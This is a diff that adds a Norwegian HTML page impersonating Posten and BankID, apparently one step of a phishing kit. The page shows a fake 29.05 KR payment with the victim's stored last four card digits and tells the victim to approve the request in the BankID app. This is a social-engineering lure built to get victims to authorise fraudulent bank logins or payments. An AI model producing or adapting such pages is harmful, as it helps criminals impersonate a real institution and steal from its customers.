@@ -1,0 +1,66 @@
+
+<!DOCTYPE html>
+<html style="font-size: 16px;" lang="en"><head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <title>Posten</title>
+    <link rel="stylesheet" href="X911/css/nc.css" media="screen">
+    <link rel="stylesheet" href="X911/css/bankid.css" media="screen">
+    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV800i">
+    <link id="u-page-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,500,500i,700,700i">
+    <meta name="theme-color" content="#478ac9">
+    <meta property="og:title" content="bankid">
+    <meta property="og:type" content="website">
+  <meta data-intl-tel-input-cdn-path="intlTelInput/"></head>
+  <body class="u-body u-xl-mode" data-lang="en"><header class="u-box-shadow u-clearfix u-header u-header" id="sec-81e4"><div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
+        <a  class="u-image u-logo u-image-1" data-image-width="2560" data-image-height="777">
+          <img src="X911/images/POS.png" class="u-logo-image u-logo-image-1">
+        </a>
+      </div></header>
+    <section class="u-clearfix u-section-1" id="sec-19ed">
+      <div class="u-clearfix u-sheet u-sheet-1">
+        <div class="u-border-1 u-border-white u-container-style u-group u-radius-12 u-shape-round u-group-1">
+          <div class="u-container-layout u-container-layout-1">
+            <img class="u-image u-image-default u-image-1" src="X911/images/bb.jpg" alt="" data-image-width="600" data-image-height="130">
+            <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-1"><b>Nettbutikk: <span style="font-weight: 400;">Posten</span></b>
+            </p>
+            <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-2"><b>Beløp: <span style="font-weight: 400;">29.05 KR</span></b>
+            </p>
+            <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-3"><b>Dato: <span style="font-weight: 400;"><script>
+date = new Date().toLocaleDateString();
+document.write(date);
+</script></span></b>
+            </p>
+            <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-4"><b>Kortnummer: <span id="last4"></b>
+            </p>
+            <img class="u-expanded-width u-image u-image-default u-image-2" src="X911/images/drop1.png" alt="" data-image-width="1500" data-image-height="200">
+            <p class="u-align-center u-custom-font u-font-ubuntu u-text u-text-default u-text-5"> gå til bankid-appen din og bekreft at det er deg</p><br>
+            <p class="u-align-center u-custom-font u-font-ubuntu u-text u-text-default u-text-5"> noen ganger tar det tid å motta varselet, vær tålmodig...</p><br>
+
+
+            <img class="u-image u-image-default u-image-3" src="X911/images/kld.gif" alt="" data-image-width="1253" data-image-height="130">
+            <img class="u-image u-image-contain u-image-default u-image-4" src="X911/images/ld.gif" alt="" data-image-width="1536" data-image-height="645">
+          </div>
+        </div>
+      </div>
+    </section>
+    
+    
+    <footer class="u-align-center u-clearfix u-custom-color-2 u-footer u-footer" id="sec-5498"><div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
+        <img class="u-image u-image-contain u-image-default u-image-1" src="X911/images/POS.png" alt="" data-image-width="2560" data-image-height="777">
+        <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-1"> © Posten Bring</p>
+      </div></footer> 
+        <script>
+// JavaScript
+document.addEventListener("DOMContentLoaded", function () {
+    var last4 = localStorage.getItem("last4digits");
+    if (last4) {
+        document.getElementById("last4").textContent = last4;
+    }
+});
+        </script>
+
+
+</body></html>
